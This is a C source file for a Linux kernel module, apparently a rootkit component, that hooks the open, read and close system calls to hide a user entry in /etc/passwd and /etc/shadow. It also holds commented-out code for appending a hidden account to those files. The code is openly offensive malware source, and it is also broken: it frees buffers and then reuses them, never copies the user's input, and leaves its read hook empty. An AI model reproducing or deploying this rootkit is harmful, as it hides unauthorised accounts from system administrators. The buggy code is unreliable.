#include "fugitive.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

static int erased;
static struct sctm_hook fugitive__hooks[3];
static char *fugitive__line = NULL;
static struct sctm *fugitive__sctm = NULL;

asmlinkage int (*good_open)(char *, int, mode_t) = NULL;
asmlinkage ssize_t (*good_read)(int, void *, size_t) = NULL;
asmlinkage int (*good_close)(int) = NULL;

/* remove a line from "/etc/passwd" and "/etc/shadow" */
int fugitive(const char __user *line) {
  char *_line;
  int retval;
  uid_t uid;
  
  if (fugitive__line != NULL)
    return -EINVAL;
  
  if (line == NULL)
    return -EFAULT;
  
  if (IS_ERR(line))
    return -EINVAL;
  _line = kcalloc(LINE_MAX, 1, GFP_KERNEL);
  
  if (IS_ERR_OR_NULL(_line))
    return -ENOMEM;
  retval = fugitive__passwd_line_to_uid(&uid, _line);
  kfree(_line);
  
  if (retval) {
    kfree(_line);
    return retval;
  }
  fugitive__line = _line;
  retval = hide_fugitive();
  
  if (retval) {
    fugitive__line = NULL;
    kfree(_line);
  }
  return retval;
}

static int fugitive__atoui(int *dest, const char *a) {
  if (dest == NULL)
    return -EFAULT;
  
  if (IS_ERR(dest))
    return -EINVAL;
  
  if (a == NULL)
    return -EFAULT;
  
  if (IS_ERR(a))
    return -EINVAL;
  *dest = 0;
  
  for (; *a; a++) {
    if (*a < '0'
        || *a > '9')
      return -EINVAL;
    *dest *= 10;
    *dest += *a - '0';
  }
  return 0;
}

int fugitive_exit(void) {
  int i;
  
  if (fugitive__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(fugitive__sctm))
    return -EINVAL;
  
  /* unhook any remaining hooks */
  
  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
    sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
  
  /* prevent a memory leak */
  
  kfree(fugitive__line); /* `kfree` should be able to handle errors/NULLs */
  return 0;
}

int fugitive_init(struct sctm *sctm) {
  if (!IS_ERR_OR_NULL(fugitive__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(sctm))
    return -EINVAL;
  
  /* init hooks */
  
  fugitive__hooks[0] = (struct sctm_hook) {
    .call = __NR_close,
    .hook = (sctm_syscall_handler_t) &this_is_requiem
  };
  good_close = (asmlinkage int (*)(int)) &fugitive__hooks[0].original;
  fugitive__hooks[1] = (struct sctm_hook) {
    .call = __NR_open,
    .hook = (sctm_syscall_handler_t) &king_crimson
  };
  good_open = (asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original;
  fugitive__hooks[2] = (struct sctm_hook) {
    .call = __NR_read,
    .hook = (sctm_syscall_handler_t) &erase_time
  };
  good_read = (asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original;
  
  fugitive__sctm = sctm;
  return 0;
}

static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line) {
  char *buf;
  size_t bufsize;
  int count;
  char *p;
  int retval;
  char *start;
  
  if (line == NULL)
    return -EFAULT;
  
  if (IS_ERR(line))
    return -EINVAL;
  
  /* locate the start of the UID entry (index 2) */
  
  for (count = 0, p = (char *) line; count < 2 && *p; p++) {
    if (*p == ':')
      count++;
  }
  
  if (count != 2)
    return -EINVAL;
  start = p;
  
  /* determine buffer size */
  
  for (bufsize = 0; *p && *p != ':'; bufsize++, p++);
  
  /* allocate buffer */
  
  buf = kcalloc(bufsize + 1, 1, GFP_KERNEL);
  
  if (IS_ERR_OR_NULL(buf))
    return -ENOMEM;
  
  /* copy */
  
  strncpy(buf, start, bufsize);
  
  /* atoi */
  
  retval = fugitive__atoui(dest, buf);
  kfree(buf);
  return retval;
}

/* restore a line in "/etc/passwd" and "/etc/shadow" */
int unfugitive(const char __user *line) {
  char *_line;
  int retval;
  uid_t uid;
  
  if (fugitive__line != NULL)
    return -EINVAL;
  
  if (line == NULL)
    return -EFAULT;
  
  if (IS_ERR(line))
    return -EINVAL;
  _line = kcalloc(LINE_MAX, 1, GFP_KERNEL);
  
  if (IS_ERR_OR_NULL(_line))
    return -ENOMEM;
  retval = fugitive__passwd_line_to_uid(&uid, _line);
  kfree(_line);
  
  if (retval) {
    kfree(_line);
    return retval;
  }
  fugitive__line = _line;
  retval = show_fugitive();
  
  if (retval) {
    fugitive__line = NULL;
    kfree(_line);
  }
  return retval;
}

/*****************************************************************************/

/*int import_fugitive(){
    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
        append_to_file(PASSWD_PATH, PASSWD_GEN());
    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
        append_to_file(SHADOW_PATH, SHADOW_GEN());
    return 0;
}*///could be useful in a future rootkit version

int hide_fugitive(void){
    int i;
    int retval;
    
    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
        if (fugitive__hooks[i].hooked)
            return -EINVAL;
    }
    
    /* add hooks */
    
    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
        retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
        
        if (retval) {
            for (; i >= 0; i--)
                sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
            return retval;
        }
    }
    return 0;
}

int show_fugitive(void){
    int hooked;
    int i;
    
    for (hooked = i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
        if (fugitive__hooks[i].hooked)
            hooked++;
    }
    
    if (!hooked)
      return -EINVAL;
    
    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
        sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
    return 0;
}

/* append "fug" to the end of "file_path" */
ssize_t append_to_file(char *file_path, char *fug){
    struct file *f;
    loff_t offset = 0;
    ssize_t ret;

    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
    if(f == NULL)
        return ENOENT;

    offset = vfs_llseek(f, offset, SEEK_END);
    ret = kernel_write(f, fug, strlen(fug), &offset);
    filp_close(f,NULL);
    return ret;
}

/* return 0 if "file_path" has line "fug" */
int has_fug(char *file_path, char *fug){
    struct file *f;
    loff_t offset;
    loff_t line_start;
    char *line_str;
    char c;

    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
    line_start = offset = 0;

    if(f == NULL)
        return ENOENT;

    /* read f char by char up to '\n', then
     * compare entire line to "fug"
     */
    while(kernel_read(f, &c, sizeof(char), &offset)){
        if(c == '\n'){
            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
            kernel_read(f, line_str, offset-line_start, &line_start);
            if(!strcmp(line_str, fug)){
                kfree(line_str);
                return 0;
            }
            kfree(line_str);
            line_start = offset;
        }
    }
    // did not find fugitive
    return -1;
}

asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
    erased &= strcmp(PASSWD_PATH, pathname);
    erased &= strcmp(SHADOW_PATH, pathname);
    if(!erased){
        //printk("need to hide file %s\n", pathname);
        // HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
    }
    return (*good_open)(pathname, flags, mode);
}

asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
    ssize_t ret;
    ret = (*good_read)(fd, buf, count);

    // if()
    //printk("the power of king crimson!\n");
    return ret;
}

asmlinkage int this_is_requiem(int fd){
    if(!erased){
        //printk("return hide file\n");
        // UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
        erased = 1;
    }
    return (*good_close)(fd);
}

